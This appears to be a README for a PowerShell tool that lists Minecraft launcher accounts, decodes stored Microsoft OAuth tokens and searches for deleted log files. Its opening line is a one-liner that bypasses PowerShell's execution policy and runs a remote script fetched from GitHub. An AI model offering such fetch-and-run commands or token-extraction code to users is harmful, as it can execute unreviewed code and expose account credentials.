- **`powershell -Command "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass; Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/OnlyDehBest/alts-checker/main/alts-checker.ps1')"`**

🛠️ **ALTS-CHECKER TOOL**

🔐 **PowerShell script to analyze locally stored Minecraft accounts**.
 - This PowerShell tool allows you to view, inspect, and decode Minecraft accounts stored in local files by TLauncher or the official Minecraft launcher, including Microsoft OAuth tokens (accessToken / id_token) when available.

📁**Open Log Folders**
 - Automatically opens log folders.

🔍 **Search for Deleted Logs**
 - Uses fsutil usn readjournal to detect traces of deleted files like:
  - latest.log, .log.gz, launcher_profiles.json, usernamecache.json, etc.
  - Results are saved to logs.txt and opened in Notepad.

🧾 **View Minecraft Accounts**
 - Scans and parses the following files:
   - TlauncherProfiles.json
   - launcher_accounts.json
   - usernamecache.json
   - usercache.json

**Displays information for each account found**:
 - Username
 - UUID
 - Account type
 - Microsoft token present ✅ / ❌
 - If a token is found, it’s decoded to show JWT claims in a readable table.

🔓 **Microsoft Token Decoder**
 - Function: Decode-Jwt
 - Accepts a JWT (accessToken or id_token).
 - Splits and base64-decodes the payload.
 - Returns readable JSON claims.

⚠️ **Requirements**
 - Windows PowerShell
 - Admin rights (for deleted file search)
 - TLauncher or Minecraft Launcher installed

📁 **Files Analyzed**
 - %APPDATA%\.minecraft\TlauncherProfiles.json
 - %APPDATA%\.minecraft\launcher_accounts.json
 - %APPDATA%\.minecraft\usernamecache.json
 - %APPDATA%\.minecraft\usercache.json

📜 **Legal Notice**
This tool is intended for personal use and debugging only. It must not be used to violate any terms of service or access unauthorized accounts.
The author is not responsible for any misuse of this script.
